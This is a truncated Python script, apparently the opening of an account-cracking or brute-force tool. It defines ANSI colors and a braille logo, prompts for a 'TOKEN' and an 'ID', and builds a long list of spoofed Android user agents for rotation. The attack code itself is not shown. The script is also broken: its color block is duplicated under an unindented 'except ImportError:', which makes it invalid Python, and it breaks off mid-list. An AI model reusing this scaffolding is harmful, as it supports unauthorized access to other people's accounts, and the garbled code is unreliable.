R = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح.
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
Z = '\033[1;31m' 
F = '\033[2;32m'
a1 = '\x1b[1;31m'  # أحمر
a2 = '\x1b[1;34m'  # أزرق
a3 = '\x1b[1;32m'  # أخضر
a4 = '\x1b[1;33m'  # أصفر
a5 = '\x1b[38;5;208m'  # برتقالي
a6 = '\x1b[38;5;5m'  # أرجواني
a7 = '\x1b[38;5;13m'  # وردي
a8 = '\x1b[1;30m'  # أسود
a9 = '\x1b[1;37m'  # أبيض
a10 = '\x1b[38;5;52m'  # بني
a11 = '\x1b[38;5;8m'  # رمادي
a12 = '\x1b[38;5;220m'  # ذهبي
a13 = '\x1b[38;5;7m'  # فضي
a14 = '\x1b[38;5;153m'  # أزرق فاتح
a15 = '\x1b[38;5;18m'  # أزرق داكن
a16 = '\x1b[38;5;48m'  # أخضر فاتح
a17 = '\x1b[38;5;22m'  # أخضر داكن
a18 = '\x1b[38;5;196m'  # أحمر فاتح
a19 = '\x1b[38;5;88m'  # أحمر داكن
a20 = '\x1b[38;5;226m'  # أصفر فاتح
a21 = '\x1b[38;5;136m'  # أصفر داكن
a22 = '\x1b[38;5;216m'  # برتقالي فات
a23 = '\x1b[38;5;166m'  # برتقالي داكن
a24 = '\x1b[38;5;234m'  # أرجواني فاتح
a25 = '\x1b[38;5;91m'  # أرجواني داكن
a26 = '\x1b[38;5;205m'  # وردي فاتح
a27 = '\x1b[38;5;161m'  # وردي داكن
a28 = '\x1b[38;5;236m'  # أسود فاتح
a29 = '\x1b[38;5;233m'  # أسود داكن
a30 = '\x1b[38;5;255m'  # أبيض فاتح
a31 = '\x1b[38;5;231m'  # أبيض داكن
a32 = '\x1b[38;5;180m'  # بني فاتح
a33 = '\x1b[38;5;94m'  # بني داكن
a34 = '\x1b[38;5;252m'  # رمادي فاتح
a35 = '\x1b[38;5;246m'  # رمادي داكن
a36 = '\x1b[38;5;228m'  # ذهبي فاتح
a37 = '\x1b[38;5;172m'  # ذهبي داكن
a38 = '\x1b[38;5;188m'  # فضي فاتح
a39 = '\x1b[38;5;247m'  # فضي داكن
a40 = '\x1b[38;5;117m'  # أزرق سماوي
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from time import sleep
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import os
import webbrowser
webbrowser.open('')        
try:
        
        import rich
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Rich •'))
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))
        os.system('pip install stdiomask')
try:
	import requests
except ImportError:
	R = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح.
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
Z = '\033[1;31m' 
F = '\033[2;32m'
a1 = '\x1b[1;31m'  # أحمر
a2 = '\x1b[1;34m'  # أزرق
a3 = '\x1b[1;32m'  # أخضر
a4 = '\x1b[1;33m'  # أصفر
a5 = '\x1b[38;5;208m'  # برتقالي
a6 = '\x1b[38;5;5m'  # أرجواني
a7 = '\x1b[38;5;13m'  # وردي
a8 = '\x1b[1;30m'  # أسود
a9 = '\x1b[1;37m'  # أبيض
a10 = '\x1b[38;5;52m'  # بني
a11 = '\x1b[38;5;8m'  # رمادي
a12 = '\x1b[38;5;220m'  # ذهبي
a13 = '\x1b[38;5;7m'  # فضي
a14 = '\x1b[38;5;153m'  # أزرق فاتح
a15 = '\x1b[38;5;18m'  # أزرق داكن
a16 = '\x1b[38;5;48m'  # أخضر فاتح
a17 = '\x1b[38;5;22m'  # أخضر داكن
a18 = '\x1b[38;5;196m'  # أحمر فاتح
a19 = '\x1b[38;5;88m'  # أحمر داكن
a20 = '\x1b[38;5;226m'  # أصفر فاتح
a21 = '\x1b[38;5;136m'  # أصفر داكن
a22 = '\x1b[38;5;216m'  # برتقالي فات
a23 = '\x1b[38;5;166m'  # برتقالي داكن
a24 = '\x1b[38;5;234m'  # أرجواني فاتح
a25 = '\x1b[38;5;91m'  # أرجواني داكن
a26 = '\x1b[38;5;205m'  # وردي فاتح
a27 = '\x1b[38;5;161m'  # وردي داكن
a28 = '\x1b[38;5;236m'  # أسود فاتح
a29 = '\x1b[38;5;233m'  # أسود داكن
a30 = '\x1b[38;5;255m'  # أبيض فاتح
a31 = '\x1b[38;5;231m'  # أبيض داكن
a32 = '\x1b[38;5;180m'  # بني فاتح
a33 = '\x1b[38;5;94m'  # بني داكن
a34 = '\x1b[38;5;252m'  # رمادي فاتح
a35 = '\x1b[38;5;246m'  # رمادي داكن
a36 = '\x1b[38;5;228m'  # ذهبي فاتح
a37 = '\x1b[38;5;172m'  # ذهبي داكن
a38 = '\x1b[38;5;188m'  # فضي فاتح
a39 = '\x1b[38;5;247m'  # فضي داكن
a40 = '\x1b[38;5;117m'  # أزرق سماوي
import sys,time,os
class DEM:
    def __init__(self,z):
        for e in z+'\n':
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.0009)

logo=(a40+ '''⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣶⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⢿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡀⠀⣤⣾⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣇⠀⠻⢿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣆⠀⠀⠙⢿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣷⡄⠀⠈⢿⣿⣿⣿⣿⣿⣶⣦⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣦⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣧⠀⠘⠋⠻⣿⣿⣿⣿⣿⣍⠉⠻⢿⣿⠿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡆⠀⠀⠀⣿⣿⠇⠘⢿⣿⣷⡀⠀⠹⣦⠈⠻⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⠀⣿⣿⣧⠀⠀⠀⠹⣷⡄⠀⣸⣧⠀⠈⢿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣠⣀⣠⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⡀⠀⠀⠘⢿⣿⣄⠀⠀⠀⠈⠀⢾⣿⣿⣤⣀⠀⢻⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣟⠻⣿⣿⣷⣦⣤⣀⣀⠀⢀⣀⣾⣿⣿⠻⣷⠀⠀⠀⠀⠻⣿⡇⠀⠀⠀⠀⠀⠉⠻⣿⣿⣿⣾⣿⣿⣷⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢸⣿⡄⠘⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⠀⢻⣧⠀⠀⠀⠀⢙⣷⣿⣿⣿⣿⣷⣧⣤⣾⣿⠿⠿⣶⣶⣶⣾⡿⠿⠿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠛⠿⣶⣤⣀⠉⠉⠋⠁⠀⠀⠀⠀⠀⠀⠀⢸⣿⡆⠀⠀⠀⡾⠻⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠈⣿⣿⣿⣿⣷⠀⠈⠻⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠙⠻⣿⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⣼⣿⠇⠀⠀⠀⠀⠀⠻⡿⠻⠿⣿⣿⣿⠁⢿⣷⡄⠀⢻⣿⣿⡿⠙⠓⠀⠀⠹⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠙⢿⣿⣿⣦⡀⠀⠀⠀⠀⠹⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⣰⣶⣿⣿⡁⠘⢿⣿⣇⣀⠹⣿⣧⣀⠀⡄⠀⠀⠈⢿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣦⣤⣀⣀⠀⠀⠙⠻⠦⠀⠀⠀⠀⣿⡶⠛⣻⣿⣿⣿⣦⡀⠙⠿⢿⣦⣈⣹⣿⣿⣿⠀⣴⠀⡀⠉⠻⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣷⣦⣄⠀⠀⡀⠀⠀⠀⠉⢴⡿⣿⣿⣿⡿⣿⣿⣶⣤⡈⠉⠉⠉⢿⣿⣿⣿⣿⣾⣇⠀⣀⠀⠉⢻⣦⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣯⠻⢿⣿⡛⢿⣿⡟⣋⡀⠀⠀⣤⣤⣶⣿⣿⣿⣿⣾⣿⣿⣿⣿⣷⣦⣤⣀⡈⠙⠛⠛⠿⠿⠛⠋⠀⢀⣤⣿⡿⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣷⣄⠈⢻⣦⣼⡿⠋⣁⣴⣆⣈⣽⣿⣿⣿⣿⣿⣿⣿⣿⣶⣭⣙⣻⣿⣿⣿⣿⣶⣶⣶⣶⣶⣶⡾⠿⠛⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣷⣴⡿⠏⠁⠾⠋⢙⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣭⣿⣿⡋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣷⣴⡟⠀⠙⠛⠛⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠉⠉⠛⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⠋⠀⠀⠀⠀⢀⣠⣿⡿⢿⣿⣿⣿⣿⣿⠋⠹⡏⠿⠀⠈⠉⠁⠀⠀⠀⠀⣿⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣷⠀⠀⠘⠛⠛⠋⠁⠒⠛⣿⣿⣿⣿⣿⠆⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠟⢹⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⣼⢟⣿⣿⣿⣿⣴⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣷⣤⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⣀⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⣦⣹⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣧⠀⠀⠀⠀⠀⠾⣿⢿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⡗⠀⠀⠀⠀⠀⠀⠀⢉⣿⣿⣿⣿⣿⣿⣴⣧⣀⠀⢀⡀⢀⠀⢠⡰⣦⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣿⣿⣿⣦⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣷⠀⠀⣦⣴⣶⣾⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⠀⠈⠛⠁⠛⠁⠈⢀⣿⠟⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠁⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠏⠙⣿⣿⣿⣿⣿⣿⡟⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡟⠟⠙⠋⠈⠃⠈⠋⢨⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣧⣠⣾⡄⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠀⢠⣀⣾⣾⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⢀⡀⢠⡀⠀⠀⡀⢀⡀⣀⣠⣤⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣸⣿⣿⣷⣿⣴⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡿⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
''')
def clear():
    os.system('clear')
def i():
    DEM(logo)
i()
print(a16+'▭▬'*25)
token=input(B+'TOKEN • تــوڪـن →'+F)
print(a16+'▭▬'*25)
ID=input(B+' ID • ايــدي →'+F)
os.system('clear')
os.system('clear')
pretty.install()
CON = sol()
os.system('clear')
cetak(nel('\t• Sedang Menginstall Modul Requests •'))

pretty.install()
CON=sol()
user_agent=['Mozilla/5.0 (Linux; Android 13.0; OnePlus 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Xiaomi Mi 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Nexus 6P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Nexus 6P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy Note 20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Nexus 6P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) 